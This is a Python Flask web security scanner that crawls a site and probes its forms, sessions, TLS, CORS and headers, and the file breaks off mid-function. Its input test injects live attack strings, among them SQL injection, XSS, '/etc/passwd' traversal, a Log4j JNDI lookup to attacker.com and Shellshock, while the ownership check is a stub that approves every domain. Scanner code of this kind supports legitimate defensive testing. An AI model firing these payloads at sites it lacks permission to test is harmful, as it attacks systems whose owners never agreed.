from flask import Flask, request, jsonify, render_template
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException, ElementNotInteractableException, InvalidElementStateException
from selenium.webdriver.common.action_chains import ActionChains
import time
import logging
import re
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import base64
import binascii
import json
import ssl
import socket
from datetime import datetime, timezone
from collections import deque
import threading
# Initialize Flask app
app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='security_tests.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def requests_retry_session(
    retries=3,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None,
):
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# Helper function to setup headless browser
def setup_headless_browser():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-software-rasterizer")  # Disable software rasterizer
    chrome_options.add_argument("--disable-gpu-compositing")  # Ensure GPU compositing is disabled
    chrome_options.add_argument("--window-size=1920x1080")  # Set a default window size to ensure element rendering
    return webdriver.Chrome(options=chrome_options)



# Helper function to validate URL
def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

# Helper function to check domain ownership (dummy function)
def check_domain_ownership(url):
    # In a real-world application, this should verify the user owns the domain.
    # For now, it assumes all URLs are owned by the user.
    return True


# function for web crawling change max_depth=3 if you have more pages to check
def crawl_website(start_url, max_depth=3, rate_limit=10):
    visited = set()
    queue = deque([(start_url, 0)])
    results = []

    while queue:
        url, depth = queue.popleft()
        
        if url in visited or depth > max_depth:
            continue
        
        visited.add(url)
        
        try:
            logging.info(f"Crawling: {url}")
            driver = setup_headless_browser()
            driver.get(url)
            
            # Wait for page load or all tests to complete
            time.sleep(rate_limit)
            
            # Run all security tests
            page_results = run_security_tests(url)
            
            results.append({
                'url': url,
                'depth': depth,
                'results': page_results
            })
            
            # Find links on the page
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            for link in soup.find_all('a', href=True):
                next_url = urljoin(url, link['href'])
                if next_url.startswith(start_url):  # Only follow links within the same domain
                    queue.append((next_url, depth + 1))
            
            driver.quit()
            
        except Exception as e:
            logging.error(f"Error crawling {url}: {str(e)}")
    
    return results

# Function to perform security tests
def run_security_tests(url):
    results = {}
    driver = None

    if not validate_url(url):
        return {'error': 'Invalid URL format.'}

    if not check_domain_ownership(url):
        return {'error': 'Unauthorized domain. You do not have permission to test this URL.'}

    logging.info(f"Running security tests on {url}")

    try:
        # Try to set up the headless browser
        driver = setup_headless_browser()
        logging.info("Headless browser setup successfully.")
        
        # Automated security checks only proceed if the browser setup succeeds
        results['input_validation'] = check_input_validation(driver, url)
        results['csrf_protection'] = check_csrf_protection(driver, url)
        results['auth_session'] = check_auth_session(driver, url)
        results['access_control'] = check_access_control(driver, url)
        results['error_handling'] = check_error_handling(driver, url)
        results['cors'] = check_cors(url)
        
        # SSL/TLS Configuration Check
        results['ssl_tls'] = check_ssl_tls(url)

        results['waf_detection'] = check_waf(url)
        results['server_version'] = check_server_version(url)
        # Existing automated checks
        results['xss_protection'] = check_xss_protection(url)
        results['https'] = check_https(url)
        results['security_headers'] = check_security_headers(url)

    except Exception as e:
        logging.error(f"Error during security testing: {str(e)}")
        results['error'] = {
            'description': 'An error occurred during security testing.',
            'status': 'Error',
            'details': str(e)
        }
    finally:
        # Always ensure the browser is closed after testing
        if driver:
            driver.quit()

    # Log success only after the security tests have run successfully
    logging.info(f"Security tests completed successfully for {url}")

    return results



# Retry mechanism to improve reliability
def retry(func, retries=3, delay=2):
    for _ in range(retries):
        try:
            return func()
        except Exception as e:
            logging.warning(f"Retry failed: {str(e)}")
            time.sleep(delay)
    raise Exception("Maximum retries reached")

#SSL TLS Check
def check_ssl_tls(url):
    """
    Checks the SSL/TLS configuration of the website, including certificate validity, expiration, and cipher suites.
    """
    logging.info(f"Starting SSL/TLS check for URL: {url}")
    
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    port = 443  # Default port for HTTPS

    try:
        # Create a context to get SSL information
        logging.debug(f"Creating SSL context for {hostname}")
        context = ssl.create_default_context()

        # Connect to the server to retrieve the SSL certificate
        with socket.create_connection((hostname, port), timeout=10) as sock:
            logging.debug(f"Socket connection created to {hostname}:{port}")
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                logging.debug(f"SSL connection established to {hostname}:{port}")

                # Get the certificate from the connection
                cert = ssock.getpeercert()
                logging.debug(f"Certificate received: {cert}")

                # Extract certificate details
                issued_to = cert.get('subject', [])
                issued_by = cert.get('issuer', [])
                
                # Convert 'notBefore' and 'notAfter' to timezone-aware datetimes
                valid_from = datetime.strptime(cert['notBefore'], '%b %d %H:%M:%S %Y %Z').replace(tzinfo=timezone.utc)
                valid_until = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z').replace(tzinfo=timezone.utc)

                logging.info(f"SSL certificate details: Issued to: {issued_to}, Issued by: {issued_by}, "
                             f"Valid from: {valid_from}, Valid until: {valid_until}")

                # Use timezone-aware current date
                current_date = datetime.now(timezone.utc)
                logging.debug(f"Current UTC time: {current_date}")

                # Check if the certificate has expired
                if valid_until < current_date:
                    status = 'Poor'
                    details = f"SSL certificate expired on {valid_until}."
                    logging.warning(f"SSL certificate expired for {hostname}. Expired on {valid_until}.")
                else:
                    status = 'Good'
                    details = f"SSL certificate is valid until {valid_until}."
                    logging.info(f"SSL certificate is valid until {valid_until} for {hostname}")

                # SSL Cipher Suite analysis (Checking for weak ciphers)
                cipher = ssock.cipher()
                logging.debug(f"SSL cipher in use: {cipher}")
                weak_ciphers = ['DES', '3DES', 'RC4', 'MD5', 'NULL', 'EXP', 'aNULL', 'eNULL']
                if any(weak in cipher[0] for weak in weak_ciphers):
                    status = 'Poor'
                    details += f" Weak cipher suite detected: {cipher[0]}."
                    logging.warning(f"Weak cipher suite detected: {cipher[0]} for {hostname}")

                return {
                    'description': 'Checks the SSL/TLS configuration of the website.',
                    'status': status,
                    'details': f"Issued to: {issued_to}, Issued by: {issued_by}, Valid from: {valid_from}, {details}. Cipher: {cipher[0]}",
                    'certificate': {
                        'issued_to': issued_to,
                        'issued_by': issued_by,
                        'valid_from': valid_from,
                        'valid_until': valid_until,
                        'cipher': cipher[0]
                    }
                }
    except ssl.SSLError as e:
        logging.error(f"SSL Error occurred for {hostname}: {str(e)}")
        return {
            'description': 'Checks the SSL/TLS configuration of the website.',
            'status': 'Error',
            'details': f'SSL Error occurred: {str(e)}'
        }
    except socket.error as e:
        logging.error(f"Socket error occurred while connecting to {hostname}:{port}: {str(e)}")
        return {
            'description': 'Checks the SSL/TLS configuration of the website.',
            'status': 'Error',
            'details': f'Socket error occurred: {str(e)}'
        }
    except Exception as e:
        logging.error(f"General error occurred during SSL/TLS check for {hostname}: {str(e)}")
        return {
            'description': 'Checks the SSL/TLS configuration of the website.',
            'status': 'Error',
            'details': f'Error occurred during SSL/TLS check: {str(e)}'
        }

# Check Cors 
def check_cors(url):
    try:
        response = requests_retry_session().options(url, timeout=10)  # Timeout to avoid long delays
        cors_headers = {
            'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
            'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
            'Access-Control-Allow-Headers': response.headers.get('Access-Control-Allow-Headers'),
            'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials')
        }

        details = {
            'origin_policy': '',
            'allowed_methods': '',
            'allowed_headers': '',
            'credentials_allowed': ''
        }

        # Check the CORS policy regarding allowed origins
        if cors_headers['Access-Control-Allow-Origin'] == '*':
            status = 'Poor'
            details['origin_policy'] = 'CORS policy allows all origins, which is insecure.'
        elif cors_headers['Access-Control-Allow-Origin']:
            status = 'Good'
            details['origin_policy'] = f'CORS policy restricts access to {cors_headers["Access-Control-Allow-Origin"]}.'
        else:
            status = 'Missing'
            details['origin_policy'] = 'No Access-Control-Allow-Origin header detected.'

        # Check for allowed methods
        if cors_headers['Access-Control-Allow-Methods']:
            details['allowed_methods'] = f'Allowed methods: {cors_headers["Access-Control-Allow-Methods"]}'
        else:
            details['allowed_methods'] = 'No Access-Control-Allow-Methods header detected.'

        # Check for allowed headers
        if cors_headers['Access-Control-Allow-Headers']:
            details['allowed_headers'] = f'Allowed headers: {cors_headers["Access-Control-Allow-Headers"]}'
        else:
            details['allowed_headers'] = 'No Access-Control-Allow-Headers header detected.'

        # Check if credentials are allowed
        if cors_headers['Access-Control-Allow-Credentials'] == 'true':
            details['credentials_allowed'] = 'Credentials are allowed for CORS requests.'
        elif cors_headers['Access-Control-Allow-Credentials'] == 'false':
            details['credentials_allowed'] = 'Credentials are not allowed for CORS requests.'
        else:
            details['credentials_allowed'] = 'No Access-Control-Allow-Credentials header detected.'

        return {
            'description': 'Checks for Cors implementation.',
            'status': status,
            'details': details,
            'cors_headers': cors_headers  # Include all checked headers in the response for further analysis
        }

    except requests.Timeout:
        logging.error(f"Timeout during CORS check for {url}")
        return {'status': 'Error', 'details': {'error': 'Request timed out during CORS check.'}}
    except requests.ConnectionError:
        logging.error(f"Connection error during CORS check for {url}")
        return {'status': 'Error', 'details': {'error': 'Connection error occurred during CORS check.'}}
    except requests.RequestException as e:
        logging.error(f"Error during CORS check: {str(e)}")
        return {'status': 'Error', 'details': {'error': f'Error occurred during CORS check: {str(e)}'}}




# Test function for CSRF protection
def check_csrf_protection(driver, url):
    try:
        driver.get(url)

        # Wait for the page to load
        try:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        except TimeoutException:
            return {
                'description': 'Checks for CSRF token implementation.',
                'status': 'Error',
                'details': 'Timeout while loading the page.'
            }

        csrf_protections = {
            'token_in_session': False,
            'token_in_js': False,
            'token_in_meta': False,
            'samesite_cookie': False,
            'token_strength': 'Unknown'
        }

        # Check for CSRF token in JavaScript
        js_content = driver.execute_script("return document.documentElement.outerHTML;")
        token_in_js = re.search(r"let\s+csrfToken\s*=\s*'[a-f0-9]{64}'", js_content)
        if token_in_js:
            csrf_protections['token_in_js'] = True
            csrf_protections['token_strength'] = validate_token_strength(token_in_js.group(0))

        # Check for CSRF meta tags
        meta_csrf = driver.find_elements(By.CSS_SELECTOR, "meta[name='csrf-token']")
        if meta_csrf:
            csrf_token_value = meta_csrf[0].get_attribute("content")
            csrf_protections['token_in_meta'] = True
            csrf_protections['token_strength'] = validate_token_strength(csrf_token_value)

        # Check for SameSite cookie attribute
        cookies = driver.get_cookies()
        for cookie in cookies:
            if cookie.get('sameSite') in ['Strict', 'Lax']:
                csrf_protections['samesite_cookie'] = True
                break

        # Generate human-readable details for CSRF protections
        protection_details_list = []
        if csrf_protections['token_in_js']:
            protection_details_list.append('CSRF token found in JavaScript.')
        if csrf_protections['token_in_meta']:
            protection_details_list.append('CSRF token found in meta tag.')
        if csrf_protections['samesite_cookie']:
            protection_details_list.append('SameSite cookie attribute is set.')
        if not any(csrf_protections.values()):
            protection_details_list.append('No CSRF protections found.')

        # Join the list of protection details into a readable string
        protection_details_str = '; '.join(protection_details_list)

        # Determine the overall CSRF protection status
        if csrf_protections['token_in_js'] or csrf_protections['token_in_meta']:
            status = 'Good'
            protection_summary = 'CSRF token found, providing good protection.'
        elif csrf_protections['samesite_cookie']:
            status = 'Fair'
            protection_summary = 'SameSite cookie attribute is set, providing some protection.'
        else:
            status = 'Poor'
            protection_summary = 'No CSRF protections found, the site may be vulnerable to CSRF attacks.'

        return {
            'description': 'Checks for CSRF token implementation and strength.',
            'status': status,
            'details': {
                'protection_summary': protection_summary,
                'csrf_protections': protection_details_str
            }
        }

    except Exception as e:
        return {
            'description': 'Checks for CSRF token implementation.',
            'status': 'Error',
            'details': {'error': f'Error occurred while checking: {str(e)}'}
        }




# Helper function to validate CSRF token strength
def validate_token_strength(token):
    """
    Validate the strength of a CSRF token based on its encoding scheme and size.
    Supports base64, hex, base32, and JWT token formats.
    """
    try:
        # Detect if the token is a JWT (JSON Web Token)
        if is_jwt_token(token):
            return validate_jwt_strength(token)

        # Try Base64 decoding
        try:
            decoded_token = base64.b64decode(token, validate=True)
            if len(decoded_token) >= 16:
                return 'Strong'
        except (binascii.Error, ValueError):
            pass  # Not a valid Base64-encoded token

        # Try Base32 decoding
        try:
            decoded_token = base64.b32decode(token, casefold=True)
            if len(decoded_token) >= 16:
                return 'Strong'
        except (binascii.Error, ValueError):
            pass  # Not a valid Base32-encoded token

        # Try Hex decoding
        try:
            decoded_token = binascii.unhexlify(token)
            if len(decoded_token) >= 16:
                return 'Strong'
        except (binascii.Error, ValueError):
            pass  # Not a valid Hex-encoded token

        # If the token is plain text, check its length directly
        if len(token) >= 32:  # Minimum of 128 bits (16 bytes) in plain text
            return 'Strong'

        # If none of the encodings were valid or token is too short
        return 'Weak'
    except Exception as e:
        logging.warning(f"Error during CSRF token validation: {str(e)}")
        return 'Unknown'

def is_jwt_token(token):
    """
    Detect if a token is in JWT (JSON Web Token) format.
    JWTs typically consist of three Base64-encoded parts separated by dots.
    """
    return re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', token) is not None

def validate_jwt_strength(token):
    """
    Validate the strength of a JWT (JSON Web Token).
    Check if the JWT has sufficient length in its header, payload, and signature parts.
    """
    try:
        # Split JWT into its three parts: header, payload, and signature
        header, payload, signature = token.split('.')
        
        # Decode the header and payload (they are base64url encoded)
        header_decoded = base64.urlsafe_b64decode(pad_base64(header)).decode('utf-8')
        payload_decoded = base64.urlsafe_b64decode(pad_base64(payload)).decode('utf-8')

        # Check if the decoded payload contains sufficient entropy or length
        # JWT signatures are usually strong, so we only need to check the length
        if len(signature) >= 32:  # Roughly 128-bit strength or higher
            return 'Strong'
        else:
            return 'Weak'
    except Exception as e:
        logging.warning(f"Error during JWT token validation: {str(e)}")
        return 'Unknown'

def pad_base64(b64_string):
    """
    Pad Base64 strings with "=" to make them valid for decoding if necessary.
    """
    return b64_string + '=' * (4 - len(b64_string) % 4)

def check_waf(url):
    """
    Detects common WAF by checking for specific headers, status codes, or content patterns.
    """
    try:
        response = requests_retry_session().get(url, timeout=10)
        
        # Common WAF headers to check for
        waf_headers = {
            'X-WAF-Detected': 'Generic WAF',
            'X-Sucuri-ID': 'Sucuri WAF',
            'X-Firewall': 'Firewall',
            'X-CDN-Protection': 'CDN Protection',
            'Server': 'Cloudflare',  # Cloudflare also provides WAF
            'X-Request-ID': 'Akamai WAF'
        }
        
        detected_waf = {}
        
        # Check headers for WAF signatures
        for header, waf_name in waf_headers.items():
            if header in response.headers:
                detected_waf[header] = waf_name
        
        # Check for specific status codes (403, 406, 429)
        if response.status_code in [403, 406, 429]:
            detected_waf['status_code'] = f"Potential WAF block: {response.status_code}"
        
        # Check response content for known WAF signatures
        blocked_keywords = ['Access Denied', 'This request has been blocked', 'Security Error', 'Forbidden', 'Your IP has been blocked']
        if any(keyword in response.text for keyword in blocked_keywords):
            detected_waf['body_check'] = 'WAF Block: Response contains blocking keywords.'

        # Return WAF details if detected
        if detected_waf:
            return {
                'description': 'WAF Detection',
                'status': 'Detected',
                'details': detected_waf
            }
        else:
            return {
                'description': 'WAF Detection',
                'status': 'Not Detected',
                'details': 'No WAF detected through headers, status code, or response content.'
            }
    except requests.RequestException as e:
        return {
            'description': 'WAF Detection',
            'status': 'Error',
            'details': f'Error occurred while detecting WAF: {str(e)}'
        }


# Function to check the server version
def check_server_version(url):
    try:
        # Send a HEAD request to get the headers without fetching the body
        response = requests_retry_session().head(url, timeout=10)
        
        # Extract the 'Server' header
        server_version = response.headers.get('Server')
        
        if server_version:
            return {
                'description': 'Checks the web server version.',
                'status': 'Detected',
                'details': f'Server version: {server_version}'
            }
        else:
            return {
                'description': 'Checks the web server version.',
                'status': 'Not Found',
                'details': 'Server version header is not exposed.'
            }
    except requests.RequestException as e:
        return {
            'description': 'Checks the web server version.',
            'status': 'Error',
            'details': f'Error occurred while checking server version: {str(e)}'
        }



# Test function for input validation
def check_input_validation(driver, url):
    try:
        driver.get(url)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        test_inputs = [
            ("'", "SQL Injection"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("1 OR 1=1", "SQL Injection"),
            ("../../../etc/passwd", "Path Traversal"),
            ("${jndi:ldap://attacker.com/a}", "Log4j"),
            ("() { :; }; echo vulnerable", "Shellshock"),
            ("%0ASet-Cookie: sessionid=abcdef123456", "HTTP Header Injection")
        ]

        vulnerabilities = []

        def is_element_interactable(element):
            try:
                return element.is_displayed() and element.is_enabled()
            except StaleElementReferenceException:
                return False

        def interact_with_form(form, input_field, test_input):
            try:
                if not is_element_interactable(input_field):
                    return None, False

                # Store the current URL
                original_url = driver.current_url

                # Interact with the form
                driver.execute_script("arguments[0].scrollIntoView(true);", input_field)
                time.sleep(0.5)
                driver.execute_script("arguments[0].value = arguments[1];", input_field, test_input)
                driver.execute_script("arguments[0].submit();", form)

                # Wait for page load
                WebDriverWait(driver, 10).until(
                    lambda d: d.execute_script('return document.readyState') == 'complete'
                )

                # Check if the URL has changed
                url_changed = driver.current_url != original_url

                return driver.page_source, url_changed
            except Exception as e:
                logging.warning(f"Error interacting with form: {str(e)}")
                return None, False

        def analyze_response(response, url_changed, test_input, vuln_type):
            if not response:
                return None

            soup = BeautifulSoup(response, 'html.parser')

            # Remove script and style elements
            for script in soup(["script", "style"]):
                script.decompose()

            visible_text = soup.get_text().lower()

            # Patterns for detecting vulnerabilities
            sql_patterns = [r"sql syntax", r"mysql error", r"ora-\d{5}", r"sql server error"]
            xss_patterns = [r"<script>alert\('XSS'\)</script>"]
            path_traversal_patterns = [r"root:.*:0:0:", r"win.ini"]

            if vuln_type == "SQL Injection" and any(re.search(pattern, visible_text) for pattern in sql_patterns):
                return "High likelihood of SQL Injection vulnerability"
            elif vuln_type == "XSS" and any(re.search(pattern, response) for pattern in xss_patterns):
                return "High likelihood of XSS vulnerability"
            elif vuln_type == "Path Traversal" and any(re.search(pattern, visible_text) for pattern in path_traversal_patterns):
                return "High likelihood of Path Traversal vulnerability"
            elif "error" in visible_text and test_input.lower() in visible_text:
                return f"Potential {vuln_type} vulnerability - input reflected in error message"
            elif url_changed and any(keyword in urlparse(driver.current_url).path.lower() for keyword in ["error", "invalid", "failure"]):
                return f"Potential {vuln_type} vulnerability - redirected to error page"

            return None

        forms = driver.find_elements(By.TAG_NAME, "form")
        for form_index, form in enumerate(forms, 1):
            form_action = form.get_attribute('action') or 'No action specified'
            form_method = form.get_attribute('method') or 'GET'
            inputs = form.find_elements(By.TAG_NAME, "input")

            for input_index, input_field in enumerate(inputs, 1):
                if not is_element_interactable(input_field):
                    continue

                input_name = input_field.get_attribute('name') or f'Unnamed input {input_index}'
                input_type = input_field.get_attribute('type') or 'text'

                if input_type in ['submit', 'button', 'hidden', 'file']:
                    continue

                for test_input, vuln_type in test_inputs:
                    response, url_changed = interact_with_form(form, input_field, test_input)

                    if response:
                        analysis_result = analyze_response(response, url_changed, test_input, vuln_type)
                        if analysis_result:
                            vulnerabilities.append({
                                "type": vuln_type,
                                "input": test_input,
                                "form_index": form_index,
                                "form_action": form_action,
                                "form_method": form_method,
                                "input_name": input_name,
                                "input_type": input_type,
                                "details": analysis_result
                            })

                    # Navigate back to the original page
                    driver.back()
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

                    # Re-find the form and input after navigating back
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    if form_index <= len(forms):
                        form = forms[form_index - 1]
                        inputs = form.find_elements(By.TAG_NAME, "input")
                        if input_index <= len(inputs):
                            input_field = inputs[input_index - 1]
                        else:
                            break
                    else:
                        break

        # Structuring vulnerabilities for better readability and front-end presentation
        if vulnerabilities:
            return {
                'description': 'Checks for proper input validation and sanitization.',
                'status': 'Potential Issues Found',
                'details': {
                    'vulnerabilities': vulnerabilities,
                    'summary': f"{len(vulnerabilities)} potential vulnerabilities detected, manual verification required."
                }
            }
        else:
            return {
                'description': 'Checks for proper input validation and sanitization.',
                'status': 'Good',
                'details': {
                    'summary': 'No obvious input validation issues detected.'
                }
            }
    except Exception as e:
        return {
            'description': 'Checks for proper input validation and sanitization.',
            'status': 'Error',
            'details': {
                'error': f'Error occurred while checking: {str(e)}'
            }
        }



# Test function for error handling
def check_error_handling(driver, url):
    results = []
    
    def check_error_page(path, expected_status):
        try:
            test_url = urljoin(url, path)
            
            # First, use requests to check the status code
            response = requests_retry_session().get(test_url, allow_redirects=False, timeout=10)
            actual_status = response.status_code
            
            # Then use Selenium for content analysis
            driver.get(test_url)
            
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            except TimeoutException:
                return {
                    'path': path,
                    'expected_status': expected_status,
                    'actual_status': 'Timeout',
                    'details': 'Timeout while loading the page.'
                }

            page_source = driver.page_source.lower()
            title = driver.title.lower()

            # Check for custom error page
            error_patterns = [r'404', r'not found', r'error', r'exception', r'stack trace', r'debug', r'unexpected', r'sorry']
            error_indicators = [pattern for pattern in error_patterns if re.search(pattern, page_source + title)]

            # Check for sensitive information
            sensitive_info = ["exception", "stack trace", "debug", "sql", "database", "server error", "internal server", "syntax error"]
            exposed_info = [info for info in sensitive_info if info in page_source]

            if actual_status == expected_status and error_indicators and not exposed_info:
                status = 'Good'
                details = f'Proper error page found (Status: {actual_status}) without sensitive information.'
            elif actual_status != expected_status:
                status = 'Poor'
                details = f'Unexpected status code. Expected {expected_status}, got {actual_status}.'
            elif exposed_info:
                status = 'Poor'
                details = f'Error page may expose sensitive information: {", ".join(exposed_info)}'
            elif not error_indicators:
                status = 'Fair'
                details = f'Status code correct ({actual_status}), but no clear error indicators on the page.'
            else:
                status = 'Fair'
                details = f'Error page found, but it may need improvement.'

            return {
                'path': path,
                'expected_status': expected_status,
                'actual_status': actual_status,
                'status': status,
                'details': details
            }
        except Exception as e:
            return {
                'path': path,
                'expected_status': expected_status,
                'actual_status': 'Error',
                'status': 'Error',
                'details': f'Error occurred while checking: {str(e)}'
            }

    # Check various error scenarios
    results.append(check_error_page("/non_existent_page_12345", 404))
    results.append(check_error_page("/index.php", 404))  # Assuming PHP is not used
    results.append(check_error_page("/.htaccess", 403))
    results.append(check_error_page("/server-status", 403))

    # Analyze results
    overall_status = 'Good' if all(r['status'] == 'Good' for r in results) else 'Poor'
    
    return {
        'description': 'Checks for proper error handling across various scenarios.',
        'status': overall_status,
        'details': results
    }

# Test function for access control
def check_access_control(driver, url):
    restricted_paths = ["/admin", "/dashboard", "/user/profile", "/settings"]
    results = []
    
    try:
        for path in restricted_paths:
            full_url = urljoin(url, path)
            driver.get(full_url)
            
            try:
                # Wait for the page to load or for a potential 404 error
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # Check if it's a 404 error
                if "404" in driver.title.lower() or "not found" in driver.page_source.lower():
                    results.append({
                        'path': path,
                        'status': 'Inconclusive',
                        'details': f'Path "{path}" returns a 404 error. Unable to determine access control.'
                    })
                # Check if redirected to login page or access denied
                elif "login" in driver.current_url.lower() or "unauthorized" in driver.page_source.lower():
                    results.append({
                        'path': path,
                        'status': 'Good',
                        'details': f'Restricted area "{path}" properly protected.'
                    })
                else:
                    results.append({
                        'path': path,
                        'status': 'Poor',
                        'details': f'Potential unauthorized access to "{path}".'
                    })
            except TimeoutException:
                results.append({
                    'path': path,
                    'status': 'Error',
                    'details': f'Timeout while accessing "{path}". Unable to determine access control.'
                })

        # Determine overall status
        statuses = [r['status'] for r in results]
        if all(status == 'Good' for status in statuses):
            overall_status = 'Good'
        elif all(status in ['Good', 'Inconclusive'] for status in statuses):
            overall_status = 'Fair'
        elif 'Poor' in statuses:
            overall_status = 'Poor'
        else:
            overall_status = 'Inconclusive'

        return {
            'description': 'Checks for proper access control implementation.',
            'status': overall_status,
            'details': results
        }
    except Exception as e:
        return {
            'description': 'Checks for proper access control implementation.',
            'status': 'Error',
            'details': f'Error occurred while checking: {str(e)}'
        }

# Test function for session management
def check_auth_session(driver, url):
    try:
        driver.get(url)
        
        # Wait for the page to load or for a potential 404 error
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
        except TimeoutException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Error',
                'details': 'Timeout while loading the page. Unable to perform authentication check.'
            }
        
        # Check if it's a 404 error
        if "404" in driver.title.lower() or "not found" in driver.page_source.lower():
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'The page returns a 404 error. Unable to perform authentication check.'
            }
        
        # Look for login form
        try:
            login_form = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "form[action*='login']"))
            )
        except TimeoutException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'Could not find a login form to test.'
            }
        
        # Attempt login with dummy credentials
        try:
            username_field = driver.find_element(By.NAME, "username")
            password_field = driver.find_element(By.NAME, "password")
            username_field.send_keys("testuser")
            password_field.send_keys("testpassword")
            login_form.submit()
        except NoSuchElementException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'Could not find username or password fields in the login form.'
            }
        
        # Wait for the page to load after login attempt
        try:
            WebDriverWait(driver, 10).until(
                EC.staleness_of(login_form)
            )
        except TimeoutException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'Page did not change after login attempt. Unable to determine if login was successful.'
            }
        
        # Check for session cookie
        cookies = driver.get_cookies()
        session_cookie = next((cookie for cookie in cookies if 'session' in cookie['name'].lower()), None)
        
        if session_cookie:
            # Test session persistence
            driver.delete_cookie(session_cookie['name'])
            driver.refresh()
            
            if "login" in driver.current_url.lower():
                return {
                    'description': 'Checks authentication and session management.',
                    'status': 'Good',
                    'details': 'Session appears to be properly managed.'
                }
            else:
                return {
                    'description': 'Checks authentication and session management.',
                    'status': 'Poor',
                    'details': 'Session persists after cookie deletion.'
                }
        else:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Poor',
                'details': 'No session cookie found after login attempt.'
            }
    except Exception as e:
        return {
            'description': 'Checks authentication and session management.',
            'status': 'Error',
            'details': f'Error occurred while checking: {str(e)}'
        }

# Test function for XSS protection
def check_xss_protection(url):
    try:
        response = requests_retry_session().get(url, timeout=10)
        headers = response.headers
        csp = headers.get('Content-Security-Policy')
        xss_protection = headers.get('X-XSS-Protection')

        # Analyze CSP
        csp_analysis = analyze_csp(csp) if csp else "No Content Security Policy found."

        # Check for reflected XSS
        xss_payload = "<script>alert('XSS')</script>"
        xss_response = requests_retry_session().get(url, params={"q": xss_payload}, timeout=10)
        reflected_xss = xss_payload in xss_response.text

        if csp and not reflected_xss:
            return {
                'description': 'Checks for XSS protection measures.',
                'status': 'Good',
                'details': f'CSP is implemented and no reflected XSS detected. CSP Analysis: {csp_analysis}'
            }
        elif csp or not reflected_xss:
            return {
                'description': 'Checks for XSS protection measures.',
                'status': 'Fair',
                'details': f'Some XSS protection measures are in place, but improvements are recommended. CSP Analysis: {csp_analysis}'
            }
        else:
            return {
                'description': 'Checks for XSS protection measures.',
                'status': 'Poor',
                'details': f'No effective XSS protection measures detected. Reflected XSS might be possible. CSP Analysis: {csp_analysis}'
            }
    except requests.RequestException:
        return {
            'description': 'Checks for XSS protection measures.',
            'status': 'Error',
            'details': 'Failed to connect to the website.'
        }

def analyze_csp(csp):
    directives = csp.split(';')
    analysis = []
    for directive in directives:
        if 'unsafe-inline' in directive or 'unsafe-eval' in directive:
            analysis.append(f"Warning: {directive.strip()} allows potentially unsafe practices.")
        elif '*' in directive:
            analysis.append(f"Warning: {directive.strip()} uses a wildcard, which may be overly permissive.")
        else:
            analysis.append(f"Good: {directive.strip()} is properly restrictive.")
    return ' '.join(analysis)

# Test function for HTTPS
def check_https(url):
    try:
        response = requests_retry_session().get(url, allow_redirects=True, timeout=10)
        final_url = response.url

        if final_url.startswith('https://'):
            hsts = response.headers.get('Strict-Transport-Security')
            if hsts:
                return {
                    'description': 'Checks for HTTPS implementation.',
                    'status': 'Good',
                    'details': 'HTTPS is enforced and HSTS is implemented.'
                }
            else:
                return {
                    'description': 'Checks for HTTPS implementation.',
                    'status': 'Fair',
                    'details': 'HTTPS is used, but HSTS is not implemented.'
                }
        else:
            return {
                'description': 'Checks for HTTPS implementation.',
                'status': 'Poor',
                'details': 'HTTPS is not used.'
            }
    except requests.RequestException:
        return {
            'description': 'Checks for HTTPS implementation.',
            'status': 'Error',
            'details': 'Failed to connect to the website.'
        }

# Test function for security headers
def check_security_headers(url):
    try:
        response = requests_retry_session().get(url, timeout=10)
        headers = response.headers

        # Define the headers to check
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'X-XSS-Protection': headers.get('X-XSS-Protection'),
            'Referrer-Policy': headers.get('Referrer-Policy'),
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
